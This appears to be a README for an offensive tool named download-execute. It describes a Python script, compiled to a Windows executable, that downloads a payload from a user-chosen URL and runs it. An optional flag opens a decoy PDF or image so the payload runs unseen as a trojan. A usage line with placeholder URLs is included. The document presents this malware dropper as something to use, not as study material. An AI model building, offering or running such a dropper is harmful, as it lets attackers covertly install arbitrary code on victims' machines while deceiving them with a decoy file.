# download-execute
Downloads and executes payloads of your choosing.

# Usage
Compile into an executable of your choosing (tested on Windows).
Before compiling, make sure the argument -p is set to the URL of
the payload you want to download and execute. An optional -t argument
can be set which can act as a trojan by supplying the url an image or a pdf
to open while the payload runs in the background.

Example: `python3 download_execute.py -t <url-pdf>.pdf -p <payload-url>.exe`